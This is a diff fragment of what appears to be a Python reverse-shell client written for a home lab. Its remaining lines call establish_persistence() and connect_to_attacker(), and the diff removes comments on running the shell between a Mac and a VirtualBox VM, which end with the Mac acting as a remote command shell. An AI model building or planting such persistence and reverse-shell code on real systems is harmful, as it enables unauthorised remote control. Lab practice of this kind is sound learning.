@@ -64,15 +64,3 @@ def connect_to_attacker():
 establish_persistence()
 connect_to_attacker()
 
-#  Run Reverse Shell Between Mac & VirtualBox VM
-# 1. make sure in virtual box network setting, the network adapter is set to bridged adapter and the name is en0: wifi and start the VM
-# 2. Make sure your VM is running your mac local Ip address (ipconfig getifaddr en0) and In VM, run (ip a) and look for your mac IP adresss. To vertify, run ping <mac ipddress> in VM and get relpies
-# 3. On your mac, run the server.py script
-
-# 2 ways to sent the client.py file to your VM
-#   a. On your mac terminal, run scp client.py <vm username>@<vm ip address>:<path to save the file> and enter the password
-#   b. you can share the folder betwrn the VM and mac and run it from the shared folder
- 
-# 4. On your VM, run the client.py script and should see the connection established message on VM terminal
-# 5. Now your Mac terminal is now a remote command shell, type any command and should see the output on VM terminal and then sent to mac terminal
-# 6. to exit the connection, type quit on mac terminal and should see the connection lost message on VM terminal
